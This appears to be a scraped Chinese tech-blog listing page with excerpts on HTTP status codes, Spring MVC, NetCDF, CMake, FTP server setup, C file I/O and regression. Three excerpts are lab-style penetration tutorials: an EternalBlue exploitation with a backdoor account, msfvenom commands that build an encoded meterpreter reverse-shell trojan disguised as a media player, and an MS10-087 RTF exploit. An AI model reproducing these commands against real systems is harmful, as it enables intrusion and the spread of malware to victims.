仅记录在 RFC2616 上的 HTTP 状态码就达 40 种，若再加上 WebDAV（Web-based Distributed Authoring and Versioning，基于万维网的分布式创作和版本控制）（RFC4918、5842） 和附加 HTTP 状态码（RFC6585）等扩展，数量就达 60 余种。别看种类繁多，实际上经常使用的大概只有 14 种。接下来，我们就介绍一下这些具有代表性的 14 个状态码。 2XX 成功 2XX 的响应结果表明请求被正常处理了。
200 OK
表示从客户端发来的请求在服务器端被正常处理了。
在响应报文内，随状态码一起返回的信息会因方法的不同而发生改变。比如，使用 GET 方法时，对应请求资源的实体会作为响应返回；而使用 HEAD 方法时，对应请求资源的实体首部不随报文主体作为响应返回（即在响应中只返回首部，不会返回实体的主体部分）。
204 No Content
该状态码代表服务器接收的请求已成功处理，但在返回的响应报文中不含实体的主体部分。另外，也不允许返回任何实体的主体。比如，当从浏览器发出请求处理后，返回 204 响应，那么浏览器显示的页面不发生更新。
一般在只需要从客户端往服务器发送信息，而对客户端不需要发送新信息内容的情况下使用
curl --location --request POST 'http://121.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b4fb6bf107e834164dfc2465a78a6d4b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/59fab23397d6c25769a2e4be2509fca6/" rel="bookmark">
			【漏洞复现】MS17-010漏洞（永恒之蓝）复现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		永恒之蓝漏洞复现 漏洞复现对目标靶机建立用户，并且开启靶机的远程桌面，使用该用户进行连接 实验准备：win7 (192.168.217.153)、win10、kali、Xshell 实验步骤： 漏洞复现 使用Xshell连接kali linux虚拟机，将账户切换到root账户。
切换为root用户：sudo su
----kali linux虚拟机经常死机无响应，可以使用Xshell连接执行命令。
查询win7 IP地址（192.168.217.153），使用nmap扫描win7，看445端口是否开启，发现445端口开启，可能存在MS17-010漏洞
进入Metasploit，查找ms17-010漏洞脚本
进入Metasploit：msfconsole
查找ms17-010漏洞脚本:search ms17-010
使用auxiliary/scanner/smb/smb_ms17_010扫描，并查看需要配置的属性
查看配置参数：show options
配置好目标机器IP，进行扫描检测,结果该系统为win7专业版，可以进行ms17-010漏洞攻击。
使用exploit/windows/smb/ms17_010_eternalblue进行攻击，同样先查看配置数据
配置好RHOSTS就可以开始攻击了
出现meterpreter即为成功
对目标靶机建立用户，并且开启靶机的远程桌面，使用该用户进行连接 对目标靶机建立用户，并将用户加入管理员组
开启靶机远程桌面服务，使用nmap扫描发现3389端口已开启
开启远程桌面：run getgui -e
运行窗口输入mstsc打开远程桌面连接，使用新创建的账户连接win7
连接成功
如有错误，欢迎批评指正[鞠躬]
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/546fb08d2df3c3b034e5e1af42e313f3/" rel="bookmark">
			ServletAPI 2-10复杂参数, 解析完的参数值都会放到 ModelAndViewContainer里面
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		总结： 找到解析器后，用解析器去解析参数，都使用了resolveArgument()中以下方法
mavContainer.getModel(); mavContainer:模型和视图容器 视图：页面请求要返回一个地方，这个地方的地址叫视图 。比如要到/sucess
模型：携带的数据称为模型 复杂参数 Map Model :会被放在request请求域中，相当于调用了request.setAttribute
Errors/BindingRequest
RedirectAttributes 重定向携带数据
ServletResponse
SessionStatus UriComponentBuilder ServletComponentBuilder
转发生效前提 return "forward:/success2"; 该类必须标注 @Controller 而不是@RestController，标准后者只会输出原文
方法注解参数设定非必须 value="msg2",required = false
@ResponseBody @GetMapping("/success2") public Map success2(@RequestAttribute(value="msg2",required = false) String msg2, @RequestAttribute(value="code",required = false) Integer code, HttpServletRequest request ){ 给Request域中放数据 map model request response
TestFuza(Map&lt;String,Object&gt; map,
Model model,
HttpServletRequest request,
HttpServletResponse response
)
@Controller public class FuzaController { @GetMapping("/fuza") public String TestFuza(Map&lt;String,Object&gt; map, Model model, HttpServletRequest request, HttpServletResponse response ) { map.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/546fb08d2df3c3b034e5e1af42e313f3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/16a19352f164fac4d4218fc34fca3574/" rel="bookmark">
			NetCDF(nc)读写与格式转换介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文介绍了NetCDF文件格式，并详细讲解了如何使用Python对NetCDF文件进行读写操作，进而介绍了NetCDF文件的地理参考，最后以两个数据为例讲解了怎么将NetCDF格式的数据转GeoTIFF格式的数据（.nc文件转为.tif文件）。
1 什么是栅格数据 栅格数据是根据一定规则将地理空间分割成有规律且大小相同的网格，每一个网格称为一个像元，并在各像元上赋予相应的属性值来表示实体的一种数据形式。每一个像元的位置由它的行列号定义，所表示的实体位置隐含在栅格行列位置中。每个栅格像元都有一个值，代表由其行列数所决定的该位置上的实体的某一特征，如果像元在栅格数据所表示的实体的范围之外，则其像元值为no data或null。栅格数据可能包含多个波段，各个波段具有相同的行列数，反映同一范围下实体在不同方面的信息。
在栅格结构中，点用一个栅格像元表示；线状地物则用沿线走向的一组相邻的栅格像元表示，每个栅格像元最多只有两个相邻像元在线上；面状地物用标记有区域属性的相邻栅格像元的集合表示，每个栅格像元可以有多于两个的相邻像元。栅格像元最常用的形状为正方形，此外也有长方形、三角形、六边形等。遥感影像就属于典型的栅格结构，其中每个像元的数字表示影像的灰度等级。
栅格数据结构的特点是属性明显、定位隐含，即数据直接记录属性值，而所在位置则根据行列号转换为相应的坐标。由于栅格结构是按照一定的规则排列的，因此其所表示实体的位置很容易隐含在网格文件的存储结构中，每个存储单元的行列位置可以根据其在文件中的记录位置得到，而行列坐标可以很容易地转换成任意坐标系下的坐标。
2 NetCDF文件格式介绍 NetCDF全称为Network Common Data Format，即网络通用数据格式，它是由美国大学大气研究协会的Unidata项目科学家针对科学数据的特点开发的，是一种面向数组型并适于网络共享的数据描述和编码标准。NetCDF文件格式设计伊始的目的是用于存储气象科学中的数据，由于其可以对网络数据进行高效地存储、管理、获取和分发等操作的特点，目前被广泛应用于大气科学、水文、环境模拟、地球物理等诸多领域。
从数学关系上看，NetCDF数据格式中存储的数据具有多对一的函数关系，"多"是指维，"一"是指变量值，这种数据结构的最大特点是能够方便地使用多维矩阵。例如，某个气象站点记录的随时间变化的温度数据以一维数组的形式存储，某个区域内在指定时间的温度以二维数组的形式存储，某个区域内随时间变化的温度用三维数组存储，某个区域内随时间和高度变化的温度用四维数组存储。Python中有一系列的工具可以操作和使用 NetCDF数据，其中常用的由netCDF4和xarray等，本文只介绍 netCDF4。
NetCDF文件后缀一般为.nc或.nc4，数据结构包含组（Groups）、维（Dimensions）、变量（Variables）和属性（Attributes）四种描述类型。
Groups：类似于unix文件系统的目录结构，以/开始，称为根组，所有的变量都包含在其下。请注意，NetCDF有很多版本，仅NetCDF 4支持创建Group。Dimensions：维对应着变量中自变量的取值范围，NetCDF根据维度定义所有变量的大小，因此在创建任何变量之前，必须先创建它们使用的维度。Variables：类似与numpy数组，但是Variables的维度是由Dimensions指定的。Attributes：变量和维在NetCDF中只是无量纲的数字，因此必须采用某种方式来让人们明白这些数字的含义，属性在这里就派上用场了。 综上所述，一个典型的NetCDF文件的数据结构如下所示：
3 NetCDF文件的基本信息 3.1 创建/打开/关闭一个NetCDF文件 NetCDF和zip、jpeg、bmp文件格式类似，都是一种文件格式的标准。在NetCDF的基础上，随着软硬件和应用场景的变化，逐渐发展出了多个版本，不同版本的文件格式各有不同。目前netCDF4支持以下版本：NETCDF3_CLASSIC，NETCDF3_64BIT_OFFSET，NETCDF3_64BIT_DATA，NETCDF4_CLASSIC和NETCDF4。其中，NETCDF3_CLASSIC是原始的NetCDF二进制格式，缺陷是文件大小不能超过2G，之后的格式没有此限制。NETCDF4_CLASSIC和NETCDF4格式支持HDF5，能够读取HDF5的库也可以处理这两种格式，因此使用h5py可以读取NETCDF4_CLASSIC和NETCDF4格式的文件，但不能新建该格式的文件。
打开或创建一个NetCDF文件需要使用netCDF4的Dataset类，使用方法类似于Python的open函数，一般需要传入两个参数，一个是要打开或创建的文件的路径（filename）；另一个则是打开文件的模式（mode），共有如下几种：
mode说明r只读，文件必须存在，此为默认的 moder+读写，文件必须存在w创建新文件写，已经存在的文件会被覆盖掉a打开已经存在的文件进行读写，如果不存在则创建一个新文件读写 在下面的代码中，我们先导入netCDF4模块，后用该模块以只读的方式打开了示例数据。
&gt;&gt;&gt; from netCDF4 import Dataset &gt;&gt;&gt; rootgrp = Dataset("./test.nc", "r") &gt;&gt;&gt; print(rootgrp.data_model) NETCDF4 &gt;&gt;&gt; rootgrp.close() netCDF4.Dataset类的返回值rootgrp是一个netCDF4的数据集示例，其既是文件的根目录，也是文件的入口。数据集是组、维度、变量和属性的容器，它们一起描述了数据的含义以及存储在NetCDF文件中的数据字段。数据集的data_model记录了NetCDF 文件的版本，close()方法用于关闭文件。
3.2 NetCDF文件的组 NetCDF在第四个版本中增加了对分层组织数据的支持，即Group，类似于文件系统中的目录。Group是变量、维度和属性以及其他组的容器。数据集是一个特殊的组，一般被称为“根组”，类似于unix文件系统中的根目录。若要在一个数据集或者组下创建新的组，需要使用数据集或组实例的createGroup()方法。该方法只有一个参数，即包含新组名称的Python字符串。
在下面的代码中，我们首先创建了一个名为test.nc的文件，进而在文件的根组下使用createGroup()方法创建了两个新组，该方法的返回值为新建的组的实例。
&gt;&gt;&gt; rootgrp = Dataset("test.nc", "a") &gt;&gt;&gt; fcstgrp = rootgrp.createGroup("forecasts") &gt;&gt;&gt; analgrp = rootgrp.createGroup("analyses") &gt;&gt;&gt; 数据集和组中包含的新组可以使用group属性查询，其返回结果是一个字典，该字典的键值对分别为组名和组的实例，因此可以通过group属性的返回值直接使用组名获取组的实例。此外，数据集或组实例本身也相当于一个字典，因此也可以直接通过数据集或组实例使用组名获取组的实例。
&gt;&gt;&gt; print(rootgrp.groups) {'forecasts': &lt;class 'netCDF4.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/16a19352f164fac4d4218fc34fca3574/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fbc69b7146ceeae8070334da0b6f6f9f/" rel="bookmark">
			Strapi 的使用 以及接口api 数据的正常获取
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Strapi(后台)安装与使用 通用的cms(内容管理系统)后台
· 后台面板，方便建表
· 提供RESTful API 或者GraphQL endpoint 给前端获取数据
· 角色与权限管理
· 插件系统，有丰富插件
· 可以自定义源代码
官方文档：https://getstrapi.cn/developer-docs/latest/getting-started/introduction.html
安装 注意 nodejs 版本需要 &gt;=14.19.1 &lt;=18.x.x
npx create-strapi-app my-project
yarn create-strapi-app my-project
? Choose your installation type Quickstart (recommended) 安装使用SQLite Custom (manual settings) 选择其他数据库 新手入坑：strapi官网教程的简单示例学习:
https://blog.csdn.net/qq_36812165/article/details/115533628
接口访问(postman) 通过我们设置好对应的接口 保存并将 其发布后
图片操作提示
然后在在setting 里面的public 里将对应设置好的Content-Type 设置puble 权限 保存后
即可访问 访问的方式 可以直接/api/xxx (对应的content-type 名称 比如图一中有的/api/posts)
当然 strpai 的版本不同 也会导致访问的路径可能会有些变化
我的版本为 strpai v.5.6 node v16.17.0
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fbc69b7146ceeae8070334da0b6f6f9f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1413ef50f26d6d58783fb70f40934036/" rel="bookmark">
			C&#43;&#43;使用小教程01--CMakeList
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 学习前言相关概念编译GCCLLVM（后端）Clang（前端） makemakefile CMakeCMakeList.txt 基本用法构建和链接静态库和动态库add_librarytarget_link_libraries 检测外部库：I. 使用pkg-config检测外部库：II. 自定义find模块find_package总而言之，有四种方式可用于找到依赖包 链接自己写的库的例子参考 学习前言 最近经常要编译github上clone下来的工程，大部分是基于cmake构建。要是自己想改一改，加一加就需要自己写CMakelist.txt。其中有几个问题始终云里雾里，花了很多时间才搞定。现在主要对找包的问题总结一下。
相关概念 编译 GCC GNU编译器套件gcc可以编译C，C++，Fortran，Java等等编程语言。当程序只有一个源文件时，直接用gcc就可以编译。
LLVM（后端） 刚进入 Apple，Chris Lattner 就大展身手：首先在 OpenGL 小组做代码优化，把 LLVM 运行时的编译架在 OpenGL 栈上，这样 OpenGL 栈能够产出更高效率的图形代码。如果显卡足够高级，这些代码会直接扔入 GPU 执行
同时，LLVM 的链接优化被直接加入到 Apple 的代码链接器上，而 LLVM-GCC 也被同步到使用 GCC4.0 代码。
Clang（前端） Clang是LLVM 的前端，可以用来编译 C，C++，ObjectiveC 等语言。Clang 则是以 LLVM 为后端的一款高效易用，并且与IDE 结合很好的编译前端
make makefile makefile，即自动化编译脚本，提供了编译和链接的指令，由make工具实现这些指令。makefile中包括了调用gcc或其他编译器编译源代码的命令。
CMake CMake是一个构建生成器，提供了强大的领域特定语言(DSL)来描述构建系统应该实现的功能。这是CMake的主要优势之一，它允许使用相同的CMake脚本集生成平台原生构建系统。CMake软件工具集，使开发人员可以完全控制给定项目的生命周期：
• CMake是描述如何在所有主要硬件和操作系统上配置、构建和安装项目，无论是构建可执行文件、库，还是两者都要构建。
• CTest定义测试、测试套件，并设置应该如何执行。
• CPack为打包需求提供了DSL。
• CDash将项目的测试结果在面板中展示。
CMakeList.txt CMakeList.txt（组态档）为cmake提供了生成makefile的指令。类似makefile与make工具的关系。其中组态档是由人工完成的。
基本用法 构建和链接静态库和动态库 当有Message.cpp 和Message.h文件后， 先把它们编译成一个库，而不是直接编译成可执行文件
1.创建目标-静态库。库的名称和源码文件名相同，如下：
add_library(message STATIC Message.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1413ef50f26d6d58783fb70f40934036/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c0700175c6ac6ae22f9ca1b3459a44bf/" rel="bookmark">
			个人内外网存储服务器（主要是外网ftp）完整解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		个人内外网存储服务器（主要是外网ftp）完整解决方案
目录
引言原理介绍硬件与系统、软件配置内网传输配置SMB外网传输ftp客户端配置网络设置（拨号、端口转发、动态域名服务）使用方法与其他总结 引言 随着互联网技术的发展，大家对于网络的需求量也越来越大，对数据的需求量也与日俱增。面对不是很方便的互联网数据交换，尤其是大文件、远程备份，本方案应运而生。其实文中所述网上都有，但是都不能应对各种复杂情况。本文优选各种方案，确保大多数读者都适用，不必费尽心思四处寻找资料。
本文服务器主机配置：CPU：i3-4130，主板某嘉B85m-d3v，内存金士顿ddr3 4g*2 1600mhz双通道，显卡某嘉gt630，硬盘：金士顿a400 240g，西数蓝盘1t。
服务器主机系统Windows Server 2019 Datacenter桌面体验版，客户机系统Windows 11 build22000.71专业工作站版。 FileZilla版本0.9.60。
原理介绍 鉴于大多数用户使用windows操作系统，服务器使用Windows Server系统。内网传输采用SMB协议，简单说来就是windows中右键共享，但这类共享只在局域网中有效（广域网不是不行，而是windows固定了445端口，使用此协议有永恒之蓝风险，非常不建议使用），其优点是可以实时访问、读取、调用共享的文件，传输速度高（瓶颈是内网传输速率，一般WIFI6路由器可以做到100mb/s以上）。访问方式简单，可以通过桌面上的网络文件夹进行访问（当然，运行-输入“//+ip”也可以）。
外网访问采用ftp协议。Windows自带的ftp服务器模块体验极差，这里采用FileZilla Server。ftp传输需要两个端口（端口好比你与外界通信的小门，每个应用或进程占用一定数量的“门”，所以大家互不干扰），这两个端口默认为21、20。我们使用被动模式，即固定一个命令端口（默认21，可以改），设置一些通信端口，我们访问命令端口，命令端口告诉我们访问什么数据端口，然后通信（当然这些电脑会帮你办）。但是这些端口只是在内网开放，如果我们想要在外网访问的话，必须在网关上做端口映射。而我们家庭的公网IP大多数是动态的，如果想要使用静态的话，必须将路由器或者光猫与一个域名绑定，这就是动态域名解析DDNS。
硬件与系统、软件配置 硬件准备：电脑一台。建议使用旧电脑，当然装一台也可以，配置建议赛扬+4gddr3。重点：一定要有两块及以上硬盘！！！固态硬盘装系统，另一块硬盘（机械固态都可以）储存文件，大小自己看多少比较合适。
软件准备：Windows Server镜像，FileZilla Server以及一些必要的装机软件。
安装操作系统（本文以Windows Server 2019 Datacenter桌面体验版演示）安装激活过程不再赘述，注意：安装时不要给存储盘分区，安装完成后在磁盘管理中右击磁盘将存储盘装换为动态磁盘随后再分区，这样以后才能扩展硬盘。
安装FileZilla Server。注意：演示版本为0.9.60，但是为了防止乱吗，建议使用0.9.14版本或更早，操作界面与演示大致相同。如果这些服务器版本较早无法下载，可以使用filezilla等客户端访问并且强制GB编码。
关闭专用网络防火墙，或者允许FileZilla Server通过防火墙
内网传输配置SMB 微信上极客湾老张已经做好了远比我详细的介绍，在这里就直接给链接了。
自己动手，组建简单好用的NAS！（上）
这个是硬件选择。
自己动手，组建简单好用的NAS！（中）
这个是硬件安装和系统安装（系统建议直接windows server，里面有详细介绍）
自己动手，组建简单好用的NAS！（远程配置篇）
这个是基本系统设置。
自己动手，组建简单好用的NAS！（存储同步篇）
这个是SMB和同步设置。这里提一句，个人推荐freefilesync，免费而且定时功能强大（依赖于系统的任务计划程序），可以百度教程。
如果只需要内网传输的话，到此为止就可以了（可能需要看一下第六部分）。接下来所有内容都是有关外网访问的。
外网传输ftp客户端配置 先输入管理端口号，默认14147，但是建议改掉。密码自行设定。
接下来是编辑-设置，第一页输入命令端口，默认是21，建议改掉。线程数默认为2，可以改大一点，建议48，传输速度会快一点。
然后设置被动模式，数据端口范围建议一个就行（如10000-10000），不然映射太麻烦，下面ip选第三个自动获取，网址填下面的默认。
接下来编辑-用户，右面添加用户，输入帐户密码，勾选启用，以后访问ftp就用这些帐户密码了。
下面一栏选择要共享的文件夹（可以是好几个），并为每一位用户选择文件夹权限。
至此服务器配置已完成。可以在文件资源管理器地址栏中输入ftp://(内网IP):（命令端口号）如：ftp://192.168.1.2:21回车，输入刚才的帐户密码，检验一下ftp服务器是否已经搭建完成。
这里建议同时开启ftps，使用安全的ftp访问。这个协议只需要一个端口，默认为990，你一样可以修改。首次使用需要点击生成证书。
这里不建议使用禁止非tls，这会使得你只能通过ftps协议访问。而ftps是必须使用客户端访问的，文件资源管理器并不支持。访问时，注意ftps为隐式。
网络设置（拨号、端口转发、动态域名服务） 这一块是重中之重！
首先检查家里的网络部署是什么样的。
首先百度查询IP地址，如果是100,192,10开头的是内网IP，也就是没有公网IP地址，这种情况只能做内网穿透了，这个除了向日葵价格太离谱其他都还行。
如果有公网IP，那么再检查一下你的IP是不是固定的，这个如果是一般家庭的话都是动态的，除非你买了专线，具体可以咨询宽带运营商。
紧接着检查上网方式。一般有两种。①路由器PPPOE直接拨号；②光猫拨号，路由器通过桥接或者DHCP连接光猫。
如果是①的话，服务器主机就必须要与光猫直接连接（一般是通过交换机），使用光猫直接分配的内网IP，在光猫管理界面（一般是192.168.1.1，如果不是那就是192.168.x.1，x可以是0,1,2,3,4,5，再往上基本没了）添加端口映射（有些是禁用的，如果没有禁用详见②）。但是在这种情况下，如果你想要通过DDNS将光猫与域名绑定，就需要宽带提供商工作人员操作了，非常麻烦（有些运营商不支持DDNS）。所以这里建议①情况用户改成②。
更改方法：将路由器与光猫直接连接（不能过交换机），随后与宽带运营商联系，让他们后台把光猫改为桥接。紧接着登录路由器管理界面（这里以华为AX3 pro为例，管理界面地址在路由器下面贴着），输入管理密码，进入。上网设置中将上网方式改为宽带账号上网，输入宽带账号密码，保存即可。这样你的服务器主机随便是有线还是无线连接在路由器上即可。如果有什么问题可以与运营商工程师联系。
紧接着在更多功能-安全设置-NAT服务中添加端口映射（其他路由器位置不一样） 。
第一个映射映射ftp命令端口，输入映射名称（随便起），服务器主机IP，内部端口为之前在FileZilla中定义的命令端口，外部端口随便，建议和内部保持一致。
这里解释一下内部和外部。内部端口指的是程序在主机上监听的端口，比如前面的命令端口21，如果我把内部端口21映射到外部121，这就意味着你访问时需要使用外网ip:121，而内网访问仍然是内网ip:21，相当于是为了一些无法修改端口的程序变相地修改了端口。这里要提到前文所讲的smb，之所以不推荐smb映射是因为smb无论是访问和被访问都是默认445端口，你无法通过ip:端口的形式访问，并且漏洞本身并不在于445这个端口而是smb协议本身，所以不推荐外网smb。
第二个映射映射ftp数据端口，输入映射名称（随便起，和第一个不一样就行），服务器主机IP，内部端口为之前在FileZilla中定义的数据端口，外部端口随便，建议和内部保持一致。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c0700175c6ac6ae22f9ca1b3459a44bf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/02b1a4e9d11f078a87b937800cd12a65/" rel="bookmark">
			不要被阶乘吓倒
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		不要被阶乘吓倒
阶乘（Factorial）是个很有意思的函数，但是不少人都比较怕它，我们来看看两个与阶乘相关的问题：
问题一：
给定一个整数N，那么N的阶乘N！末尾有多少个0呢？例如：N＝10，N！＝3 628 800，N！的末尾有两个0。
分析与解法
有些人碰到这样的题目会想：是不是要完整计算出N！的值？如果溢出怎么办？事实上，如果我们从"哪些数相乘能得到10"这个角度来考虑，问题就变得简单了。
首先考虑，如果N！= K×10^M，且K不能被10整除，那么N！末尾有M个0。再考虑对N！进行质因数分解，N！=（2^x）×（3^y）×（5^z）…，由于10 = 2×5，所以M只跟X和Z相关，每一对2和5相乘可以得到一个10，于是M = min（X, Z）。不难看出X大于等于Z，因为能被2整除的数出现的频率比能被5整除的数高得多，所以把公式简化为M = Z。
根据上面的分析，只要计算出Z的值，就可以得到N！末尾0的个数。
【解法一】
要计算Z，最直接的方法，就是计算i（i =1, 2, …, N）的因式分解中5的指数，然后求和：
代码清单2-6
ret = 0; for(i = 1; i &lt;= N; i++) { j = i; while(j % 5 ==0) { ret++; j /= 5; } } 这里我们可以减少循环的次数，由于只有5的倍数才能贡献5，所以，第一步，我们只需要将N除以5，就可以知道，有多少个数可以贡献5，然后再遍历小于N的所有的数，即可，可以得到程序代码：
N /= 5;ret = N;for(i = 1; i &lt;= N; i++) { j = i; while(j % 5 ==0) { ret++; j /= 5; } } 这样，循环次数就减小为原来的1/5，同理，我们可以对[N/5]，再除以5，就可以知道[N/5]能贡献几个5，以此类推，就得到书中的解法二。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/02b1a4e9d11f078a87b937800cd12a65/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fde270c2aaee2b1ffcc2cbe2b104d18c/" rel="bookmark">
			C语言进阶——文件管理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		每当我们写好一段代码运行结束之后，再次运行的时候就会发现，之前在终端上输入的数据都会消失，那么如何把之前输入的数据保存下来呢？
我们一般把数据持久化的方式有把数据存放在磁盘文件中、存放到数据库。打印等方式进行保存。
使用文件我们可以直接将数据保存在电脑的磁盘上，做到数据的持久化。
文件分为数据文件与程序文件
程序文件：包括源程序文件（后缀为.c）,目标文件（windows环境后缀为.obj）,可执行程序（windows环境后缀为.exe）。
数据文件：文件的内容不一定是程序，而是程序运行时读写的数据，比如程序运行需要从中读取数据的文件，或者输出内容的文件。
目录
一、文件的打开与关闭
1、FILE
2、文件操作函数
FILE* fopen（const char* filename, const char* mode);（失败返回NULL）
int fcolse（FILE* stream）
二、文件的顺序读写
1、fprintf与fscanf 2、fgetc与fputc
3、fgets（）与fputs（）
三、文件的打开方式
1、fopen函数中mode参数使用
2、fwrite（）二进制写入
3、fread（）二进制读入
3、使用二进制格式拷贝一张照片
四、文件的随机读写
1、ftell（）返回文件指针相对于起始位置的偏移量
2、rewind（）让文件指针回到起始位置
3、fseek（）通过文件指针的位置与偏移量来定位文件指针
五、feof函数
文本文件判断：
fgetc 使用 ch 与 EOF判断
fgets 使用 fgets的返回值 与NULL判断
二进制文件：
fread判断返回值是否小于实际要读的个数（cnt != 0）
一、文件的打开与关闭 1、FILE VS 的stdio库中对于文件的打开与关闭都离不开这么一个结构体
struct _iobuf { char *_ptr; int _cnt; char *_base; int _flag; int _file; int _charbuf; int _bufsiz; char *_tmpfname; }; typedef struct _iobuf FILE; // 给结构体_iobuf 重命名为FILE FILE 中存放着关于文件的相关信息（文件名、文件位置、文件数据……）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fde270c2aaee2b1ffcc2cbe2b104d18c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e266da9bd2ca128634fc768377891a74/" rel="bookmark">
			Python机器学习：一元回归
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		→ \rightarrow →回归效果评价
🌕 一元回归 一元回归主要研究一个自变量和一个因变量之间的关系，而这个自变量和因变量之间的关系又可分为线性回归和非线性回归。
⭐️ 一元线性回归分析两个变量之间的线性关系，如 y = k x + b y=kx+b y=kx+b中 x x x和 y y y就是线性关系。
⭐️ 一元非线性回归分析两个变量之间的非线性关系，如指数关系、对数关系等。
🌗 一元线性回归 下面用Iris数据集中的PetalLengthCm和PetalWidthCm两个变量来建立一元线性回归模型。
在建立模型前，我们要先知道一元线性回归分析法的预测模型： y = a x + b y=ax+b y=ax+b，我们要求的就是参数a和b，可以由下列公式求得：
a = n ∑ x i y i − ∑ x i ∑ y i n ∑ x i 2 − ( ∑ x i ) 2 a = \frac{n\sum x_iy_i-\sum x_i\sum y_i}{n\sum x_i^2-(\sum x_i)^2} a=n∑xi2​−(∑xi​)2n∑xi​yi​−∑xi​∑yi​​
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e266da9bd2ca128634fc768377891a74/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b6f16e23f7272105f8027325da0e8ed4/" rel="bookmark">
			基于Windows客户端渗透
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基于Windows客户端渗透 客户端渗透原理 在我们无法突破对方的网络边界时，往往需要使用客户端渗透这种方式对目标发起攻击，比如我们向目标发一个含有后门的程序，或者是一个word文档，pdf文件。想要达到效果同时也要利用好社会工程学，来诱惑受害者执行恶意程序。
由于有杀毒软件，所以我们可以利用颜色网站或者免杀来躲避查杀。
免杀可以通过修改二进制特征字符或者进行加密。
实战 制作Windows恶意软件获取shell msfvenom是msfpayload,msfencode的结合体，可利用msfvenom生成木马程序，并在目标机上执行，在本地监听上线。
生成xx影音.exe后门程序 使用一个编码器 命令：msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.139.129 LPORT=4444 -b “\x00” -e x86/shikata_ga_nai -i 10 -f exe -o /var/www/html/xx影音1.exe
使用两个编码器进一步加强免杀能力 msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.242.128 LPORT=4444 -b “\x00” -e x86/shikata_ga_nai -i 20 | msfvenom -a x86 --platform windows -e x86/alpha_upper -i 10 -f exe -o /var/www/html/xx影音2.exe
参数说明 -a 指定架构，如：x86和x64，x86代表32位，x64代表64位。
–platform 指定平台，这里选择windows，通过 --l platforms可以查看所有支持的平台
-p 设置攻击载荷
-b 去掉坏字符，坏字符会影响payload的正常执行
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b6f16e23f7272105f8027325da0e8ed4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0281f2002efec9b219628b7a83830e13/" rel="bookmark">
			基于office渗透（MS10-087 Office（word）渗透攻击）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MS10-087 Office（word）渗透攻击 简介 如果用户打开或预览特制的RTF电子邮件，则最严重的漏洞可能允许远程执行代码。成功利用这些漏洞中的任何一个的攻击者可以获得与本地用户相同的用户权限。与使用管理用户权限进行操作的用户相比，将其帐户配置为在系统上具有较少用户权限的用户受到的影响较小。
低版本的word版本会出现RTF文件漏洞。
漏洞：microsoft word中的RTF分析器中的pFragments属性容易受到栈缓存区溢出攻击
受影响的系统：Microsoft Office XP SP，2003 SP3，2007 SP2，2010 x32，2010 x64，Microsoft Office for
启动msf 命令：msfconsole
搜索MS10_087漏洞 命令：search ms10_087
使用攻击模块 命令：：use exploit/windows/fileformat/ms10_087_rtf_pfragments_bof
设置恶意文件 命令：set FILENAME ms10087.rtf
设置payload 命令：set payload windows/meterpreter/reverse_http
设置用于接受从目标机弹回的shell 开始攻击 命令：run
将/home/jack/.msf4/local/ms10087.rtf下的文件传到靶机上 现实中我们可以利用社会工程学的知识传到目标机上，在这里我们直接上传上去
进入multi/handler模块 设置payload 命令：set payload windows/meterpreter/reverse_http
设置用于接受从目标机弹回的shell 开始攻击 命令：run
shell
[外链图片转存中…(img-aq7Vliaz-1674722518515)]
开始攻击 命令：run
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2c144f781e4fe78e54d6f53f4f0c68b7/" rel="bookmark">
			基于word文档的客户端渗透（简单易懂，小白可学）
